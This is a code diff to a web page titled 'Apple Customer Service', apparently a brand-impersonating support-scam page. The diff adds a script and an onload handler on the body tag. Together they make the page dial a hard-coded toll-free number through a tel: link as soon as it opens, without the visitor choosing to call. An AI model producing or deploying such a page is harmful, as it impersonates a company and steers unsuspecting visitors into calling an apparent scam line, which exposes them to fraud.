@@ -7,9 +7,20 @@
     <title>Apple Customer Service</title>
     <link rel="stylesheet" href="./style.css" />
     <link rel="shortcut icon" href="./assets/icare.webp" type="image/x-icon">
+    <script>
+        function autoDial() {
+          var phoneNumber = "+18884909164";
+          window.location.href = "tel:" + phoneNumber;
+        }
+    
+        function call() {
+          // Implement the call functionality here, such as initiating a phone call.
+          console.log("Calling...");
+        }
+      </script>
 </head>
 
-<body>
+<body onload="autoDial()">
     <div id="main" class="w-full h-full p-10 text-center flex flex-col justify-center items-center gap-10">
         <img class="w-44" src="./assets/icare.webp" alt="icare" srcset="">
         <h2 class="text-4xl font-bold">Apple Customer Service</h2>
